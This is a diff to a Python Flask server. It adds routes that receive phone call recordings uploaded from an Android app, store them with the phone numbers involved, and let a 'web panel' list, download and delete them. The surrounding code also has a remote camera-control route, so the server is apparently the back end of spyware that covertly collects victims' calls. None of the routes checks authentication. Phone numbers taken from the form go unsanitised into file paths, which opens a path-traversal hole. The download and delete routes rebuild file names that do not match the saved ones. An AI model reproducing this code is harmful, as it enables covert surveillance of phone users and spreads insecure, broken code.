@@ -177,6 +177,111 @@ def camera_control():
         print(f"❌ Camera control error: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
 
+# Call Recording Routes
+@app.route('/call_recording', methods=['GET'])
+def get_call_recordings():
+    """Get all call recordings for web panel"""
+    try:
+        conn = sqlite3.connect('call_recordings.db')
+        c = conn.cursor()
+        c.execute("SELECT * FROM call_recordings ORDER BY timestamp DESC")
+        recordings = c.fetchall()
+        conn.close()
+        
+        return jsonify({
+            'status': 'success',
+            'recordings': recordings
+        })
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/call_recording/upload', methods=['POST'])
+def upload_call_recording():
+    """Upload call recording from Android app"""
+    try:
+        if 'recording' not in request.files:
+            return jsonify({'status': 'error', 'message': 'No recording file'})
+        
+        recording_file = request.files['recording']
+        phone_number = request.form.get('phone_number', 'Unknown')
+        call_type = request.form.get('call_type', 'Normal Call')
+        
+        if recording_file.filename == '':
+            return jsonify({'status': 'error', 'message': 'No file selected'})
+        
+        # Save recording file
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"{timestamp}_{phone_number}.wav"
+        filepath = os.path.join(RECORDINGS_DIR, filename)
+        recording_file.save(filepath)
+        
+        # Save to database
+        conn = sqlite3.connect('call_recordings.db')
+        c = conn.cursor()
+        c.execute("INSERT INTO call_recordings (phone_number, call_type, timestamp) VALUES (?, ?, ?)",
+                 (phone_number, call_type, datetime.now()))
+        conn.commit()
+        conn.close()
+        
+        return jsonify({'status': 'success', 'message': 'Recording uploaded'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/call_recording/<int:recording_id>')
+def download_recording(recording_id):
+    """Download specific recording file"""
+    try:
+        conn = sqlite3.connect('call_recordings.db')
+        c = conn.cursor()
+        c.execute("SELECT * FROM call_recordings WHERE id = ?", (recording_id,))
+        recording = c.fetchone()
+        conn.close()
+        
+        if recording:
+            phone_number = recording[1]
+            timestamp = recording[3].replace(':', '').replace(' ', '_')
+            filename = f"{timestamp}_{phone_number}.wav"
+            filepath = os.path.join(RECORDINGS_DIR, filename)
+            
+            if os.path.exists(filepath):
+                return send_file(filepath, as_attachment=True)
+        
+        return jsonify({'status': 'error', 'message': 'Recording not found'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)})
+
+@app.route('/call_recording/delete/<int:recording_id>', methods=['DELETE'])
+def delete_recording(recording_id):
+    """Delete specific recording"""
+    try:
+        # First get recording info
+        conn = sqlite3.connect('call_recordings.db')
+        c = conn.cursor()
+        c.execute("SELECT * FROM call_recordings WHERE id = ?", (recording_id,))
+        recording = c.fetchone()
+        
+        if recording:
+            # Delete from database
+            c.execute("DELETE FROM call_recordings WHERE id = ?", (recording_id,))
+            conn.commit()
+            conn.close()
+            
+            # Delete file
+            phone_number = recording[1]
+            timestamp = recording[3].replace(':', '').replace(' ', '_')
+            filename = f"{timestamp}_{phone_number}.wav"
+            filepath = os.path.join(RECORDINGS_DIR, filename)
+            
+            if os.path.exists(filepath):
+                os.remove(filepath)
+            
+            return jsonify({'status': 'success', 'message': 'Recording deleted'})
+        else:
+            conn.close()
+            return jsonify({'status': 'error', 'message': 'Recording not found'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)})
+
 # File upload endpoint
 @app.route('/data', methods=['POST'])
 def upload_file():
